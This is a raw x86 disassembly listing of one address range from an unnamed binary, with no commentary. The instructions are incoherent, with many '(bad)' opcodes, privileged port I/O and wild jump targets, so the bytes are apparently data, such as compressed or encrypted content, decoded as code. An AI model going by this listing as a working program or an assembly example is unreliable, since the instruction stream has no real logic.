  426a3b:	or     eax,0xd8c66bed
  426a40:	out    0x24,eax
  426a42:	iret   
  426a43:	inc    eax
  426a44:	cld    
  426a45:	dec    ebp
  426a46:	jo     0x426a86
  426a48:	cld    
  426a49:	push   ebx
  426a4a:	mov    al,ds:0xc5a423b7
  426a4f:	pop    ebp
  426a50:	pop    esi
  426a51:	inc    ebx
  426a52:	fimul  WORD PTR [edx+esi*1-0x3fc420]
  426a59:	sub    BYTE PTR [ecx+0x2df597e7],0x0
  426a60:	push   eax
  426a61:	and    edx,DWORD PTR [edi]
  426a63:	inc    ecx
  426a64:	mov    bl,0xd0
  426a66:	icebp  
  426a67:	add    al,BYTE PTR [eax]
  426a69:	hlt    
  426a6a:	out    0x87,al
  426a6c:	and    eax,DWORD PTR [eax+0x2c]
  426a6f:	add    BYTE PTR [eax],al
  426a71:	pusha  
  426a72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a73:	ret    
  426a74:	inc    DWORD PTR [eax]
	...
  426a8e:	adc    ebp,esi
  426a90:	fwait
  426a91:	push   ebx
  426a93:	mov    eax,ds:0x2cf42384
  426a98:	add    BYTE PTR [eax],al
  426a9a:	inc    esp
  426a9b:	aas    
  426a9c:	push   esi
  426a9d:	mov    BYTE PTR [ecx],bl
  426a9f:	and    BYTE PTR ds:0xdc34f440,dl
  426aa5:	and    edi,DWORD PTR [eax]
  426aa7:	lock or ebp,edi
  426aaa:	dec    eax
  426aab:	add    eax,0x4eb8cfcb
  426ab0:	(bad)  
  426ab2:	xlat   BYTE PTR ds:[ebx]
  426ab3:	int3   
  426ab4:	sbb    cl,BYTE PTR [edx]
  426ab6:	test   eax,0xa0cbc2b1
  426abb:	dec    esi
  426abc:	jae    0x426a85
  426abe:	xlat   BYTE PTR ds:[ebx]
  426abf:	adc    al,0x8f
  426ac1:	ins    BYTE PTR es:[edi],dx
  426ac2:	inc    esi
  426ac3:	add    eax,0xe13790e7
  426ac8:	into   
  426ac9:	rol    DWORD PTR [eax-0x28788cb1],cl
  426acf:	ins    BYTE PTR es:[edi],dx
  426ad0:	out    0x3,al
  426ad2:	hlt    
  426ad3:	sub    al,0x95
  426ad5:	ret    0x3668
  426ad8:	pop    ebx
  426ad9:	(bad)  
  426ada:	pop    ss
  426adb:	aad    0x4e
  426add:	aas    
  426ade:	mov    eax,0xb1e23d35
  426ae3:	fldenv [ecx+0x28]
  426ae6:	scas   al,BYTE PTR es:[edi]
  426ae7:	inc    ecx
  426ae8:	xchg   ebx,eax
  426ae9:	mov    cs,WORD PTR [edi-0x2c]
  426aec:	mov    ecx,0xeeb038da
  426af1:	test   BYTE PTR [eax],0x0
	...
  426b08:	add    BYTE PTR [eax],al
  426b0a:	add    BYTE PTR [edx+edx*8+0x7e],cl
  426b0e:	mov    ebp,0x8be704f7
  426b13:	mov    esi,0xb4180535
  426b18:	adc    esp,DWORD PTR [edi-0x4ec282fd]
  426b1e:	xchg   DWORD PTR ds:[esp+edx*4-0xd4fff2a],esp
  426b26:	sub    ebx,esi
  426b28:	add    ebp,eax
  426b2a:	add    edi,DWORD PTR [ebp+0x34]
  426b2d:	adc    DWORD PTR ds:0x701cd67,esi
  426b33:	sub    BYTE PTR [edi+0x29],dl
  426b36:	add    al,0x45
  426b38:	rcr    BYTE PTR [ecx],cl
  426b3a:	pop    es
  426b3b:	ss xor eax,0xd4f02aff
  426b41:	push   eax
  426b42:	sbb    bl,BYTE PTR [ebp-0x191aedc8]
  426b48:	(bad)  
  426b49:	jmp    FWORD PTR [edi-0x45]
  426b4c:	std    
  426b4d:	cmp    BYTE PTR [edx-0x697e394],ch
  426b53:	mov    WORD PTR ds:0x133519fc,?
  426b59:	sbb    al,0xda
  426b5b:	mov    bh,0x35
  426b5d:	std    
  426b5e:	cld    
  426b5f:	push   DWORD PTR [edi]
  426b61:	adc    ah,ch
  426b63:	call   0xb3716b2c
  426b68:	cmp    dh,bh
  426b6a:	push   ecx
  426b6b:	push   es
  426b6c:	lods   eax,DWORD PTR ds:[esi]
  426b6d:	jmp    FWORD PTR [eax+0x0]
	...
  426b88:	lock add al,0x51
  426b8b:	mov    bh,0x3c
  426b8d:	cmp    BYTE PTR [edx],dl
  426b8f:	rol    DWORD PTR [ecx],0xc5
  426b92:	call   DWORD PTR [ebp-0x25fbed4c]
  426b98:	aaa    
  426b99:	xor    eax,0x383b635a
  426b9e:	pop    esp
  426b9f:	ret    0x43ae
  426ba2:	pop    es
  426ba3:	jmp    0x692df7f2
  426ba8:	in     al,0xc5
  426baa:	add    ecx,ebp
  426bac:	not    ebx
  426bae:	mov    ah,ah
  426bb0:	repz adc eax,DWORD PTR [eax-0x17]
  426bb4:	sub    eax,0xbdf630d0
  426bb9:	ret    0xe9fc
  426bbc:	outs   dx,BYTE PTR ds:[esi]
  426bbd:	mov    edx,0x2d3a70f3
  426bc2:	push   esp
  426bc3:	push   ebx
  426bc4:	cli    
  426bc5:	xor    DWORD PTR [edx],edx
  426bc7:	and    eax,0x5fffc507
  426bcc:	mov    edx,0x30008624
  426bd1:	cmc    
  426bd2:	jg     0x426bcc
  426bd4:	xchg   edx,eax
  426bd5:	adc    eax,0x8dc3484
  426bda:	add    BYTE PTR [ebp-0x647a8],cl
  426be0:	xchg   edx,eax
  426be1:	pop    eax
  426be2:	sti    
  426be3:	jne    0x426b72
  426be5:	mov    ebp,0xc580b081
  426bea:	sti    
  426beb:	sub    al,0x0
	...
  426c05:	(bad)
  426c09:	mov    eax,0x9d400d4c
  426c0e:	(bad)  
  426c10:	add    BYTE PTR [ebp-0x3a7278f8],bl
  426c16:	repnz sti 
  426c18:	call   esi
  426c1a:	aad    0xb
  426c1c:	xchg   BYTE PTR [edi+eax*1+0x4060000],bh
  426c23:	xchg   esp,eax
  426c24:	loop   0x426bb4
  426c26:	or     BYTE PTR [ebx],cl
  426c28:	test   al,bh
  426c2a:	pop    es
  426c2b:	add    BYTE PTR [eax],al
  426c2d:	dec    esi
  426c2e:	enter  0x7d35,0x5
  426c32:	outs   dx,BYTE PTR ds:[esi]
  426c33:	push   cs
  426c34:	mov    ebp,DWORD PTR [eax-0x4]
  426c37:	xor    eax,0x8414cf0c
  426c3c:	ret    0x81d
  426c3f:	add    BYTE PTR [eax+0x46],al
  426c42:	dec    ebx
  426c43:	hlt    
  426c44:	jb     0x426c69
  426c46:	push   esi
  426c47:	in     al,0x15
  426c49:	repnz pop es
  426c4b:	add    BYTE PTR [ecx-0x38c81fa8],cl
  426c51:	adc    cl,BYTE PTR [edi+eiz*4-0x4f7f300]
  426c58:	mov    ch,0x55
  426c5a:	(bad)  
  426c5b:	sti    
  426c5c:	jmp    FWORD PTR [edx]
  426c5e:	popa   
  426c5f:	cld    
  426c60:	add    esi,esp
  426c62:	sbb    eax,0xde09fd00
  426c67:	adc    al,BYTE PTR [eax+0x0]
	...
  426c82:	hlt    
  426c83:	mov    dh,0x33
  426c85:	cmp    bl,cl
  426c87:	and    al,BYTE PTR [ecx+ecx*4-0x74ffe20c]
  426c8e:	cmp    DWORD PTR [edx-0x2d],ecx
  426c91:	push   ebp
  426c92:	int3   
  426c93:	sbb    ecx,ebp
  426c95:	push   DWORD PTR [ebx-0x54087705]
  426c9b:	outs   dx,BYTE PTR ds:[esi]
  426c9c:	xchg   ah,bh
  426c9e:	sub    BYTE PTR [ecx],bl
  426ca0:	mov    DWORD PTR [edx-0x70],eax
  426ca3:	inc    esi
  426ca4:	pop    es
  426ca5:	xor    BYTE PTR [edx+0x107303de],dh
  426cab:	mov    ebx,0xe9e9fcf4
  426cb0:	adc    eax,DWORD PTR [eax-0xc]
  426cb3:	out    0x6,al
  426cb5:	sub    BYTE PTR [edx+0x5e],dl
  426cb8:	add    BYTE PTR [ebx-0x40],dh
  426cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cbc:	or     al,0x50
  426cbe:	xchg   ebp,eax
  426cbf:	or     DWORD PTR [esi+0x40],ebx
  426cc2:	hlt    
  426cc3:	mov    dh,0x3
  426cc5:	call   0x46478b
  426cca:	jno    0x426ca9
  426ccc:	mov    dh,0x3e
  426cce:	outs   dx,DWORD PTR ds:[esi]
  426ccf:	nop
  426cd0:	cmp    BYTE PTR [edx+0x7b8e8],cl
  426cd6:	hlt    
  426cd7:	sbb    eax,0x520728f
  426cdc:	je     0x426c70
  426cde:	hlt    
  426cdf:	sbb    eax,0x56a0bf84
  426ce4:	mov    DWORD PTR [edx+0x0],edx
	...
  426cff:	or     al,0xb6
  426d01:	xchg   BYTE PTR [edi-0x77c2c5f7],dh
  426d07:	mov    cl,0x39
  426d09:	cmp    eax,0xe6040c72
  426d0e:	enter  0x32eb,0x23
  426d12:	xor    BYTE PTR [edx+0x9],dh
  426d15:	js     0x426d55
  426d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d18:	ins    DWORD PTR es:[edi],dx
  426d19:	retf   
  426d1a:	fcomp  DWORD PTR ds:0x32d03e2e
  426d21:	bound  eax,QWORD PTR [ebx+0x47]
  426d24:	or     DWORD PTR [ebp+0x1604c0c8],ebp
  426d2a:	sub    al,0xfe
  426d2c:	call   0xb89d:0x31e503e6
  426d33:	xchg   ebx,eax
  426d34:	xor    bh,BYTE PTR [ecx-0x748a8970]
  426d3a:	ds cwde 
  426d3c:	aad    0x85
  426d3e:	mov    eax,0xcbd332a3
  426d43:	cli    
  426d44:	(bad)  
  426d45:	out    0x88,al
  426d47:	inc    ebx
  426d48:	add    ah,BYTE PTR [esp+edi*1+0x79]
  426d4c:	xor    ah,BYTE PTR [ebp+0x3e]
  426d4f:	out    0x34,al
  426d51:	pop    ebp
  426d52:	push   edx
  426d53:	and    dh,BYTE PTR [eax+0x79770e42]
  426d59:	dec    esp
  426d5a:	ds pop eax
  426d5c:	xor    bh,BYTE PTR [ebx+0x54fd5b37]
  426d62:	add    eax,DWORD PTR [eax]
	...
  426d7c:	hlt    
  426d7d:	jle    0x426d2a
  426d7f:	mov    al,ds:0x344c91d2
  426d85:	mov    BYTE PTR [edi+esi*4],bl
  426d88:	adc    bh,BYTE PTR [esi-0x15]
  426d8b:	imul   edi,DWORD PTR [edi],0xffffffc6
  426d8e:	out    0xf2,al
  426d90:	arpl   WORD PTR [eax+0x7e06b71f],cx
  426d96:	(bad)  [edi+0x3f]
  426d99:	(bad)  
  426d9a:	out    0xfc,al
  426d9c:	lds    edi,FWORD PTR [eax-0x4cc81901]
  426da2:	shl    DWORD PTR [ecx-0x9],0x4
  426da6:	add    BYTE PTR [edx],ah
  426da8:	aaa    
  426da9:	mov    ah,0xee
  426dab:	push   0x38
  426dad:	xor    eax,eax
  426daf:	(bad)
  426db4:	lock rcl DWORD PTR [edx+0x1f],cl
  426db8:	jne    0x426df8
  426dba:	cld    
  426dbb:	cli    
  426dbc:	aaa    
  426dbd:	fnstcw WORD PTR [eax+0x4f861]
  426dc3:	fs das 
  426dc5:	mov    dh,0x23
  426dc7:	jb     0x426d74
  426dc9:	gs retf 
  426dcb:	sub    dh,al
  426dcd:	jnp    0x426da4
  426dcf:	push   0xffffff9e
  426dd1:	xor    DWORD PTR [eax-0x20],esi
  426dd4:	mov    bh,0x4
  426dd6:	rol    edx,1
  426dd8:	ss mov ah,0xf3
  426ddb:	xchg   edx,eax
  426ddc:	cli    
  426ddd:	jnp    0x426dd6
	...
  426df7:	add    BYTE PTR [eax],al
  426df9:	ror    DWORD PTR [ecx+0x3f7e8ff],0xfe
  426e00:	jb     0x426e22
  426e02:	mov    bh,0x2e
  426e04:	test   al,0x9e
  426e06:	dec    edx
  426e07:	xchg   ecx,ebp
  426e09:	test   DWORD PTR [esi+edi*4],0xffc4c485
  426e10:	push   eax
  426e11:	rcl    BYTE PTR [ebp+0x7173e8ff],0x73
  426e18:	stos   DWORD PTR es:[edi],eax
  426e19:	ins    BYTE PTR es:[edi],dx
  426e1a:	fisub  WORD PTR [edi-0x2cecae3]
  426e20:	in     al,dx
  426e21:	lahf   
  426e22:	cmp    eax,0x2e7ce940
  426e27:	pushw  ss
  426e29:	jo     0x426e5c
  426e2b:	cld    
  426e2c:	jmp    0xe65c25
  426e31:	leave  
  426e32:	inc    ebx
  426e33:	cld    
  426e34:	jae    0x426e69
  426e36:	push   esp
  426e37:	push   ebx
  426e38:	call   0x3f05a2
  426e3d:	xchg   esi,eax
  426e3e:	cmp    al,0x20
  426e40:	adc    al,0xe
  426e42:	into   
  426e43:	aas    
  426e44:	push   0xffffffdd
  426e46:	jg     0x426ebb
  426e48:	sbb    BYTE PTR [ecx+ecx*1-0x7b],dl
  426e4c:	pop    edi
  426e4d:	rcr    esp,1
  426e4f:	cmp    DWORD PTR [edx+edi*4+0x28d4ff1],edi
  426e56:	xor    esp,esp
  426e58:	xor    al,0x49
  426e5a:	icebp  
  426e5b:	sti    
  426e5c:	pop    edi
	...
  426e75:	add    bl,ch
  426e77:	jge    0x426e3a
  426e79:	pop    ebp
  426e7a:	ss ret 
  426e7c:	add    BYTE PTR [eax],al
  426e7e:	es cmp eax,0x35e2560c
  426e84:	sti    
  426e85:	xor    ecx,DWORD PTR [ebp-0x79]
  426e88:	lds    esi,FWORD PTR [eax+ebx*4+0x7d]
  426e8c:	outs   dx,DWORD PTR ds:[esi]
  426e8d:	or     al,0x6
  426e8f:	(bad)  
  426e91:	add    cl,BYTE PTR [edi+0xe400677]
  426e97:	(bad)  
  426e98:	sub    al,0x3b
  426e9a:	sbb    al,0x76
  426e9c:	out    dx,eax
  426e9d:	jmp    0x426f03
  426e9f:	pop    ebp
  426ea0:	mov    esp,0x87ca4e30
  426ea5:	clc    
  426ea6:	inc    eax
  426ea7:	es cmp eax,0x8934046b
  426ead:	jae    0x426f08
  426eaf:	fdivr  QWORD PTR [edi]
  426eb1:	xchg   esp,eax
  426eb2:	dec    ebp
  426eb3:	add    al,0x84
  426eb5:	rol    BYTE PTR [ecx+0x2d43870d],0x7d
  426ebc:	hlt    
  426ebd:	imul   ecx,DWORD PTR [edx],0x34
  426ec0:	(bad)  
  426ec1:	cmp    eax,0xfec0a8f4
  426ec6:	ins    BYTE PTR es:[edi],dx
  426ec7:	pop    ebx
  426ec8:	adc    BYTE PTR [ebp+edi*8-0x4e],dh
  426ecc:	mov    edi,0x4677d07
  426ed1:	(bad)  
  426ed2:	sti    
  426ed3:	sbb    eax,DWORD PTR [edi+0x3f7f9bc4]
  426ed9:	push   ebp
	...
  426ef2:	add    BYTE PTR [edi-0x34],bh
  426ef5:	adc    esi,DWORD PTR [ecx]
  426ef7:	mov    ah,0xf6
  426ef9:	jle    0x426ef0
  426efb:	push   0xf0768d34
  426f00:	mov    ds:0x8c7f0bca,al
  426f05:	cli    
  426f06:	jns    0x426ef8
  426f08:	clc    
  426f09:	(bad)  
  426f0a:	cmc    
  426f0b:	neg    BYTE PTR [ebx]
  426f0d:	lods   al,BYTE PTR ds:[esi]
  426f0e:	or     dh,BYTE PTR [ebx+ebx*4]
  426f11:	inc    ebp
  426f12:	das    
  426f13:	out    dx,eax
  426f14:	pop    edi
  426f15:	mov    ch,0xed
  426f17:	out    0x5d,eax
  426f19:	fcomp  DWORD PTR [ebp-0x49]
  426f1c:	add    al,BYTE PTR [edi+ebp*1-0x9]
  426f20:	pop    esp
  426f21:	sub    al,0xf5
  426f23:	jle    0x426f44
  426f25:	push   0x6bf50101
  426f2a:	inc    BYTE PTR [edi]
  426f2c:	daa    
  426f2d:	lea    eax,[ebp-0x14]
  426f30:	test   al,0x43
  426f32:	jae    0x426f5b
  426f34:	outs   dx,BYTE PTR ds:[esi]
  426f35:	sub    BYTE PTR [eax-0x16ffe2a1],dl
  426f3b:	(bad)  
  426f3d:	mov    cl,0xb
  426f3f:	outs   dx,DWORD PTR ds:[esi]
  426f40:	addr16 adc al,ch
  426f43:	in     al,dx
  426f44:	jno    0x426f7f
  426f46:	cld    
  426f47:	dec    ebx
  426f48:	ja     0x426f52
  426f4a:	call   0x4640c7
  426f4f:	cmp    esi,DWORD PTR [edi+0xc]
  426f52:	call   0x4bd7407
	...
  426f6f:	add    ah,dh
  426f71:	das    
  426f72:	xchg   esp,eax
  426f73:	jecxz  0x426f90
  426f75:	mov    eax,0x2ff4047a
  426f7a:	xchg   esp,eax
  426f7b:	jmp    0x426f98
  426f7d:	mov    al,ds:0x9af4045a
  426f82:	mov    dh,0xd1
  426f84:	sbb    ecx,ebp
  426f86:	pop    ebx
  426f87:	add    al,0xf4
  426f89:	inc    esi
  426f8a:	in     al,0x5
  426f8c:	mov    ch,0xd2
  426f8e:	cmp    edx,edx
  426f90:	inc    eax
  426f91:	jp     0x426f71
  426f93:	lods   al,BYTE PTR ds:[esi]
  426f94:	loopne 0x427013
  426f96:	out    0x3,al
  426f98:	hlt    
  426f99:	add    DWORD PTR [eax+eiz*2],ecx
  426f9c:	mov    edi,0xdef6e6c2
  426fa1:	cs xor eax,0xbede7adc
  426fa7:	lds    esp,FWORD PTR [edi+0x5]
  426faa:	out    0x3a,eax
  426fac:	sub    BYTE PTR [ebp+0x587fd8e],dh
  426fb2:	out    0x3a,eax
  426fb4:	push   0xf403e685
  426fb9:	sbb    al,0xbd
  426fbb:	(bad)  
  426fbc:	xchg   ebx,eax
  426fbd:	cs mov ecx,0xd69dc25e
  426fc3:	mov    cl,0xe4
  426fc5:	jns    0x426fc4
  426fc7:	pop    es
  426fc8:	cmc    
  426fc9:	aaa    
  426fca:	jle    0x426f75
  426fcc:	jo     0x426ffc
  426fce:	gs (bad) 
  426fd0:	je     0x42701a
  426fd2:	push   ss
  426fd3:	inc    DWORD PTR [eax]
	...
  426fed:	rcl    BYTE PTR [ecx+ebx*8],0x28
  426ff1:	pop    eax
  426ff2:	mov    dh,0xda
  426ff4:	sub    edi,esi
  426ff6:	cwde   
  426ff7:	out    0x3,al
  426ff9:	imul   ebx,DWORD PTR [ebp+0x2a],0xffffffc6
  426ffd:	inc    ebx
  426ffe:	jnp    0x426fff
  427000:	xor    BYTE PTR [esi+ebp*2+0x73],dh
  427004:	cwde   
  427005:	adc    BYTE PTR [ebx],0xa4
  427008:	xor    eax,0x31892e32
  42700d:	push   eax
  42700e:	inc    edi
  42700f:	xchg   ecx,ebp
  427011:	test   DWORD PTR [ebx+ecx*4],0xfcace85d
  427018:	push   es
  427019:	into   
  42701a:	test   BYTE PTR [esi],dh
  42701c:	jmp    0xc17765
  427021:	outs   dx,DWORD PTR ds:[esi]
  427022:	cs cld 
  427024:	jmp    0x233422e7
  427029:	sub    BYTE PTR [edx-0x4ce29bd7],dh
  42702f:	or     eax,0x903f083b
  427034:	jmp    0x8d7d7e30
  427039:	cmp    al,0xc5
  42703b:	call   ecx
  42703d:	jmp    0xff86:0x2f40cc7b
  427044:	call   0xb5e5df40
  427049:	mov    cl,0x2d
  42704b:	in     al,0x94
  42704d:	mov    ch,BYTE PTR ds:0x60fc
	...
  427067:	add    BYTE PTR [eax],al
  427069:	add    BYTE PTR [ebx-0x7d5349b],ah
  42706f:	iret   
  427070:	pop    ebp
  427071:	and    al,0xa9
  427073:	inc    esp
  427074:	push   edx
  427075:	jb     0x427043
  427077:	scas   al,BYTE PTR es:[edi]
  427078:	jmp    0x4270bf
  42707a:	call   0xa2597083
  42707f:	test   BYTE PTR [edx-0x3cf5b64],0x5e
  427086:	inc    eax
  427087:	and    eax,0x4f7f0e1
  42708c:	mov    esp,DWORD PTR [esp+edx*4+0x2c]
  427090:	cld    
  427091:	add    BYTE PTR [edx-0x5aff99a8],dh
  427097:	dec    ebp
  427098:	sar    bh,1
  42709a:	add    al,BYTE PTR [ebp+0x3d990fbc]
  4270a0:	std    
  4270a1:	call   FWORD PTR ds:0x9050c280
  4270a7:	lods   eax,DWORD PTR ds:[esi]
  4270a8:	pusha  
  4270a9:	sti    
  4270aa:	add    ch,ah
  4270ac:	dec    esp
  4270ad:	push   eax
  4270ae:	cmc    
  4270af:	xor    ecx,edx
  4270b1:	push   edx
  4270b3:	lods   eax,DWORD PTR ds:[esi]
  4270b4:	mov    esp,0xfd35990f
  4270b9:	dec    DWORD PTR ds:0x688d375f
  4270bf:	jl     0x427115
  4270c1:	call   0x42804a
  4270c6:	data16 (bad) 
  4270c8:	dec    esp
  4270c9:	lea    ecx,[eax-0x74]
  4270cc:	idiv   edi
	...
  4270e6:	add    dl,al
  4270e8:	pop    eax
  4270e9:	mov    DWORD PTR [ebp-0x40fef],eax
  4270ef:	fstp   st(0)
  4270f1:	add    al,0xd5
  4270f3:	sub    ch,0x81
  4270f6:	rcl    dl,0xac
  4270f9:	adc    BYTE PTR [ecx],al
  4270fb:	popf   
  4270fc:	or     BYTE PTR [ecx-0x4101e7b],cl
  427102:	(bad)  
  427103:	fucomp st(5)
  427105:	adc    DWORD PTR [eax-0x71],ecx
  427108:	dec    eax
  427109:	cld    
  42710a:	xor    BYTE PTR [ebp-0x13],0xb
  42710e:	test   BYTE PTR [ebx],al
  427110:	or     BYTE PTR [eax],al
  427112:	add    bh,dh
  427114:	sub    al,0x89
  427116:	jne    0x4270ad
  427118:	push   eax
  427119:	in     al,0x6a
  42711b:	hlt    
  42711c:	add    BYTE PTR [eax],al
  42711e:	push   0x0
  427120:	test   BYTE PTR [ecx-0x50],dh
  427123:	hlt    
  427124:	jne    0x42714e
  427126:	pop    esp
  427127:	in     eax,dx
  427128:	sbb    eax,0xb10a6a00
  42712d:	lods   eax,DWORD PTR ds:[esi]
  42712e:	out    dx,eax
  42712f:	pushf  
  427130:	aad    0xcc
  427132:	push   ss
  427133:	hlt    
  427134:	sbb    eax,0xdab9c5d3
  427139:	add    BYTE PTR [ebp-0x5],dl
  42713c:	retf   
  42713d:	mov    ebp,0xbd98c4fc
  427142:	mov    esp,0x81590a87
  427148:	jns    0x42719e
  42714a:	out    0x0,eax
	...
  427164:	fistp  WORD PTR [edi+0x649d0000]
  42716a:	xor    edi,0xfffffff5
  42716d:	and    al,BYTE PTR [ebp+esi*4-0x74ffe20c]
  427174:	jno    0x427137
  427176:	cmp    bh,ah
  427178:	jecxz  0x427167
  42717a:	test   eax,0x73d869fc
  42717f:	dec    edi
  427180:	jg     0x4271e4
  427182:	sar    esp,cl
  427184:	loope  0x42718f
  427186:	adc    eax,DWORD PTR [eax-0xc]
  427189:	mov    dh,0x3b
  42718b:	cmp    BYTE PTR [ebx-0x767bfb8e],0x1d
  427192:	add    BYTE PTR [eax],al
  427194:	jns    0x42712e
  427196:	xlat   BYTE PTR ds:[ebx]
  427197:	mul    BYTE PTR [ebx-0xf982c76]
  42719d:	sbb    al,0x0
  42719f:	add    BYTE PTR [ecx-0x74055860],al
  4271a5:	adc    bl,0x30
  4271a8:	mov    dl,BYTE PTR [ebx]
  4271aa:	xchg   DWORD PTR [edx-0x7c],eax
  4271ad:	or     eax,0xd504287
  4271b2:	xor    eax,0xf804c412
  4271b7:	ret    
  4271b8:	arpl   WORD PTR [eax+0x79bbb026],ax
  4271be:	imul   ebp,DWORD PTR [eax-0x61b2d4b2],0x2
  4271c5:	jb     0x427199
  4271c7:	cmp    BYTE PTR [eax],al
	...
  4271e1:	inc    eax
  4271e2:	sub    esi,DWORD PTR [edx-0x11782df1]
  4271e8:	out    0xa6,al
  4271ea:	add    al,cl
  4271ec:	xlat   BYTE PTR ds:[ebx]
  4271ed:	ret    0x6fa2
  4271f0:	or     al,0x75
  4271f2:	inc    esp
  4271f3:	call   0x9c375495
  4271f8:	daa    
  4271f9:	je     0x427226
  4271fb:	out    0xb0,eax
  4271fd:	sar    DWORD PTR [ecx+0x6b],1
  427200:	test   al,0xfe
  427202:	sub    bh,ch
  427204:	shr    DWORD PTR [esi-0x7f],cl
  427207:	mov    bh,BYTE PTR [edx]
  427209:	lock sub dl,BYTE PTR [esi-0x222e8978]
  427210:	ss loopne 0x4271e8
  427213:	into   
  427214:	sbb    al,0xc0
  427216:	sub    dl,ch
  427218:	adc    BYTE PTR [ebx+0x7e88f0b1],0xd1
  42721f:	mov    ebp,0xe41ec036
  427224:	mov    BYTE PTR [esi-0x67],ch
  427227:	mov    bl,0x36
  427229:	mov    al,0x7e
  42722b:	adc    ecx,DWORD PTR [esp+ebx*4]
  42722e:	or     eax,0x80f403e7
  427233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427234:	scas   eax,DWORD PTR es:[edi]
  427235:	out    dx,al
  427236:	sub    ch,BYTE PTR [ebx]
  427238:	aaa    
  427239:	adc    ebp,DWORD PTR [eax-0x7907c673]
  42723f:	shl    DWORD PTR [esi],1
  427241:	sub    BYTE PTR [edx],0x1d
  427244:	fild   DWORD PTR [eax]
	...
  42725e:	sbb    DWORD PTR [edi+edi*8],edi
  427261:	stos   BYTE PTR es:[edi],al
  427262:	jae    0x42728e
  427264:	push   ebx
  427265:	bound  edx,QWORD PTR [ebx]
  427267:	stos   DWORD PTR es:[edi],eax
  427268:	jmp    0x42723f
  42726a:	test   BYTE PTR [eax+eax*1],0xb7
  42726e:	sub    bl,BYTE PTR [ecx+edi*1+0x57268464]
  427275:	pusha  
  427276:	and    al,0x36
  427278:	mov    BYTE PTR [eax+0xf],al
  42727b:	rcl    DWORD PTR [edi],1
  42727d:	jmp    0x9a07ee79
  427282:	inc    edx
  427283:	jg     0x427207
  427285:	push   ebp
  427286:	jecxz  0x4272b0
  427288:	cld    
  427289:	mov    ecx,0x1ed06dcf
  42728e:	loop   0x427216
  427290:	mov    edi,0xff7593e6
  427295:	call   0xa0386691
  42729a:	dec    edi
  42729b:	stos   BYTE PTR es:[edi],al
  42729c:	(bad)  
  42729d:	call   0x9f441199
  4272a2:	popf   
  4272a3:	sub    ah,BYTE PTR [ecx+ebp*8-0x9]
  4272a7:	add    al,0x40
  4272a9:	je     0x42730e
  4272ab:	xchg   esi,eax
  4272ac:	sti    
  4272ad:	fisub  WORD PTR [ecx]
  4272af:	mov    edx,0x13b7fcfc
  4272b4:	inc    eax
  4272b5:	jmp    0x6b3e3938
  4272ba:	add    BYTE PTR [ecx],ch
  4272bc:	or     al,0x65
  4272be:	outs   dx,DWORD PTR ds:[esi]
  4272bf:	sub    esp,edi
  4272c1:	jmp    0x4272c6
	...
  4272da:	add    ah,al
  4272dc:	fwait
  4272dd:	cmp    al,0x5c
  4272df:	and    ecx,DWORD PTR [esi-0x2e165903]
  4272e5:	xor    edx,eax
  4272e7:	enter  0x143e,0xe9
  4272eb:	not    edx
  4272ed:	mov    ah,dl
  4272ef:	mov    bl,0x13
  4272f1:	inc    eax
  4272f2:	add    BYTE PTR [ebp-0x2207be7e],cl
  4272f8:	scas   eax,DWORD PTR es:[edi]
  4272f9:	inc    edx
  4272fa:	add    DWORD PTR [ebp+0x5],ebx
  4272fd:	push   ebx
  4272fe:	(bad)  
  4272ff:	ror    BYTE PTR [edx+edi*8-0x4af2501],1
  427306:	jne    0x4272c1
  427308:	out    dx,eax
  427309:	rol    BYTE PTR [ebp+0x3930751d],cl
  42730f:	cmp    ch,ch
  427311:	jno    0x427342
  427313:	into   
  427314:	jno    0x427306
  427316:	add    BYTE PTR [ecx-0xe8a04dc],al
  42731c:	out    dx,eax
  42731d:	adc    esp,eax
  42731f:	dec    edi
  427320:	inc    ebp
  427321:	cld    
  427322:	imul   ecx,DWORD PTR ds:0x508df47c,0xea574ced
  42732c:	pop    ecx
  42732d:	lock jmp DWORD PTR [eax-0xf]
  427331:	sti    
  427332:	(bad)  
  427333:	nop
  427334:	shl    BYTE PTR [eax+0x9],0x34
  427338:	jb     0x42732e
  42733a:	jne    0x42731d
  42733c:	mov    ch,0xfd
  42733e:	jmp    0x0:0x0
	...
  427355:	add    BYTE PTR [eax],al
  427357:	add    bh,bl
  427359:	xlat   BYTE PTR ss:[ebx]
  42735b:	inc    DWORD PTR [eax-0x13]
  42735e:	sti    
  42735f:	adc    eax,0x4012f9
  427364:	stos   BYTE PTR es:[edi],al
  427365:	push   edi
  427366:	clc    
  427367:	inc    eax
  427369:	sub    BYTE PTR [edi],cl
  42736b:	inc    eax
  42736c:	int    0xa8
  42736e:	xlat   BYTE PTR ds:[ebx]
  42736f:	pop    ebx
  427370:	add    ch,bh
  427372:	mov    BYTE PTR [ebp-0x40faf],al
  427378:	or     eax,0x5a35acd9
  42737d:	icebp  
  42737e:	pop    ebx
  42737f:	mov    al,0x8c
  427381:	push   edx
  427382:	(bad)
  427385:	call   0xaaba5f10
  42738a:	test   al,0x7f
  42738c:	ror    ebp,0x1e
  42738f:	inc    eax
  427390:	hlt    
  427391:	sbb    al,0xcf
  427393:	push   ebp
  427394:	retf   
  427395:	mov    ds:0xba720c30,al
  42739a:	add    BYTE PTR [eax],al
  42739c:	hlt    
  42739d:	push   ebp
  42739e:	in     al,0x76
  4273a0:	mov    ah,0x1d
  4273a2:	xor    edx,DWORD PTR [edx]
  4273a4:	test   al,0x2b
  4273a6:	sar    bh,0x70
  4273a9:	fiadd  WORD PTR [ebx]
  4273ab:	test   BYTE PTR [ebp+0x1e],ch
  4273ae:	add    BYTE PTR [eax],al
  4273b0:	jno    0x4273a2
  4273b2:	lods   al,BYTE PTR ds:[esi]
  4273b3:	jge    0x42734f
  4273b5:	call   0xfcca:0x75a7fff2
	...
  4273d4:	add    BYTE PTR [ecx],cl
  4273d6:	dec    BYTE PTR [esi]
  4273d8:	inc    eax
  4273d9:	hlt    
  4273da:	cwde   
  4273db:	cld    
  4273dc:	xor    dh,0x1d
  4273df:	add    BYTE PTR [eax],al
  4273e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273e2:	add    eax,0x1df48f43
  4273e7:	xchg   edi,esi
  4273e9:	jno    0x427412
  4273eb:	lods   eax,DWORD PTR ds:[esi]
  4273ec:	bound  edi,QWORD PTR [edi+0x6]
  4273ef:	mov    ch,cl
  4273f1:	fadd   st(3),st
